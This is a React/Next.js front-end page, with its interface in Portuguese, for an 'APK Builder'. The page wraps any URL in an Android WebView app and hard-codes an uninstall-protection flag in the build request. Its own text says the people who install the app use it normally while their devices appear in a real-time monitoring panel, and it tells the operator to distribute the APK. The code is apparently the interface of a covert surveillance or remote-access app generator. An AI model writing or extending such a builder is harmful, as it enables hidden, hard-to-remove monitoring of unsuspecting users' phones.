'use client';

import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { AlertCircle, CheckCircle2, Download } from 'lucide-react';

interface BuildState {
  appName: string;
  appUrl: string;
  logoUrl: string;
}

export default function APKBuilderPage() {
  const [config, setConfig] = useState<BuildState>({
    appName: 'Meu App',
    appUrl: 'https://example.com',
    logoUrl: 'https://via.placeholder.com/150',
  });

  const [isBuilding, setIsBuilding] = useState(false);
  const [isDownloading, setIsDownloading] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);
  const [downloadUrl, setDownloadUrl] = useState<string>('');
  const [downloadFilename, setDownloadFilename] = useState<string>('');
  const [error, setError] = useState<string>('');
  const [success, setSuccess] = useState(false);

  const handleBuildAPK = async () => {
    setError('');
    setSuccess(false);
    setIsBuilding(true);
    setBuildProgress(0);

    let interval: NodeJS.Timeout | null = null;
    try {
      // Simulate progress
      interval = setInterval(() => {
        setBuildProgress((prev) => Math.min(prev + Math.random() * 30, 90));
      }, 500);

      // Call the tRPC endpoint to build APK
      const response = await fetch('/api/trpc/apk.build?batch=1', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          0: {
            json: {
              companyName: config.appName,
              companyUrl: config.appUrl,
              logoUrl: config.logoUrl,
              protectFromUninstall: true,
            },
          },
        }),
      });

      const result = await response.json();
      console.log('Build result:', result);

      if (interval) clearInterval(interval);
      setBuildProgress(100);

      // Handle tRPC response format
      const buildResult = Array.isArray(result) ? result[0] : result;
      if (buildResult?.result?.data?.success && buildResult?.result?.data?.downloadUrl && buildResult?.result?.data?.filename) {
        setDownloadUrl(buildResult.result.data.downloadUrl);
        setDownloadFilename(buildResult.result.data.filename);
        setSuccess(true);
      } else {
        setError('Erro ao gerar APK');
      }
    } catch (error) {
      setError('Erro ao gerar APK: ' + (error instanceof Error ? error.message : 'Erro desconhecido'));
      if (interval !== null) clearInterval(interval);
    } finally {
      if (interval !== null) clearInterval(interval);
      setIsBuilding(false);
    }
  };

  const handleDownloadAPK = async () => {
    if (!downloadUrl) return;
    
    setIsDownloading(true);
    try {
      // Download directly from the public URL
      // The /apks endpoint is public and doesn't require authentication
      const link = document.createElement('a');
      link.href = downloadUrl;
      link.download = downloadFilename || 'app.apk';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      
      console.log('Download started from:', downloadUrl);
    } catch (error) {
      setError('Erro ao fazer download do APK: ' + (error instanceof Error ? error.message : 'Erro desconhecido'));
      console.error('Download error:', error);
    } finally {
      setIsDownloading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-slate-900 p-4 md:p-8">
      <div className="max-w-4xl mx-auto">
        <div className="mb-8 flex justify-between items-center">
          <h1 className="text-4xl font-bold text-cyan-300">🔨 APK Builder</h1>
        </div>

        <Card className="bg-slate-800/50 border-slate-700 mb-8 p-6">
          <p className="text-slate-300 mb-4">
            Gere um APK customizado que abre qualquer URL (site, app, serviço). Seus clientes instalam e aparecem no painel de monitoramento.
          </p>
        </Card>

        <div className="grid md:grid-cols-2 gap-8">
          {/* Configuration */}
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-cyan-300 flex items-center gap-2">
              📋 Configuração do App
            </h2>

            <div>
              <label className="block text-sm font-medium text-slate-300 mb-2">
                Nome do App *
              </label>
              <Input
                value={config.appName}
                onChange={(e) => setConfig({ ...config, appName: e.target.value })}
                placeholder="Nome que aparecerá no ícone do app"
                className="bg-slate-700 border-slate-600 text-white"
              />
              <p className="text-xs text-slate-400 mt-1">Nome que aparecerá no ícone do app</p>
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-300 mb-2">
                URL do App *
              </label>
              <Input
                value={config.appUrl}
                onChange={(e) => setConfig({ ...config, appUrl: e.target.value })}
                placeholder="https://example.com"
                className="bg-slate-700 border-slate-600 text-white"
              />
              <p className="text-xs text-slate-400 mt-1">O APK abrirá esta URL em uma WebView</p>
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-300 mb-2">
                Logo do App (URL)
              </label>
              <Input
                value={config.logoUrl}
                onChange={(e) => setConfig({ ...config, logoUrl: e.target.value })}
                placeholder="https://via.placeholder.com/150"
                className="bg-slate-700 border-slate-600 text-white"
              />
              <p className="text-xs text-slate-400 mt-1">Opcional - Logo que aparecerá no ícone</p>
            </div>

            {error && (
              <div className="bg-red-900/30 border border-red-600 rounded-lg p-4 flex gap-3">
                <AlertCircle className="text-red-400 flex-shrink-0" size={20} />
                <p className="text-red-300 text-sm">{error}</p>
              </div>
            )}

            {success && (
              <div className="bg-green-900/30 border border-green-600 rounded-lg p-4 flex gap-3">
                <CheckCircle2 className="text-green-400 flex-shrink-0" size={20} />
                <p className="text-green-300 text-sm">APK gerado com sucesso!</p>
              </div>
            )}

            <Button
              onClick={handleBuildAPK}
              disabled={isBuilding}
              className="w-full bg-cyan-500 hover:bg-cyan-600 text-white font-bold py-3"
            >
              {isBuilding ? `Gerando... ${buildProgress}%` : '⬇️ Gerar APK'}
            </Button>
          </div>

          {/* Preview */}
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-cyan-300 flex items-center gap-2">
              👁️ Prévia do App
            </h2>

            <div className="bg-slate-700 rounded-lg p-8 flex flex-col items-center justify-center min-h-96">
              <div className="w-32 h-32 bg-gradient-to-br from-cyan-400 to-blue-600 rounded-2xl flex items-center justify-center mb-4 shadow-lg">
                {config.logoUrl ? (
                  <img
                    src={config.logoUrl}
                    alt="Logo"
                    className="w-full h-full object-cover rounded-2xl"
                    onError={(e) => {
                      (e.target as HTMLImageElement).style.display = 'none';
                    }}
                  />
                ) : (
                  <span className="text-4xl">📱</span>
                )}
              </div>
              <h3 className="text-white font-bold text-center">{config.appName}</h3>
              <p className="text-slate-400 text-sm text-center mt-2">{config.appUrl}</p>
            </div>

            <div className="bg-slate-700 rounded-lg p-4 space-y-2">
              <h4 className="text-cyan-300 font-bold flex items-center gap-2">
                💡 Como funciona:
              </h4>
              <ul className="text-slate-300 text-sm space-y-1">
                <li>✓ APK abre uma URL em uma WebView</li>
                <li>✓ Cliente instala e usa normalmente</li>
                <li>✓ Dispositivo aparece no painel</li>
                <li>✓ Você monitora em tempo real</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Download Section */}
        {success && downloadUrl && (
          <div className="mt-8 bg-gradient-to-r from-green-900/30 to-cyan-900/30 border border-green-600 rounded-lg p-6">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-xl font-bold text-green-300 mb-2">✅ APK Pronto para Download!</h3>
                <p className="text-slate-300 text-sm mb-4">
                  Arquivo: <code className="bg-slate-800 px-2 py-1 rounded text-cyan-300">{downloadFilename}</code>
                </p>
                <p className="text-slate-400 text-xs">
                  Clique no botão abaixo para baixar o APK. Depois distribua para seus clientes instalarem.
                </p>
              </div>
              <Button
                onClick={handleDownloadAPK}
                disabled={isDownloading}
                className="bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 flex items-center gap-2"
              >
                <Download size={20} />
                {isDownloading ? 'Baixando...' : 'Baixar APK'}
              </Button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
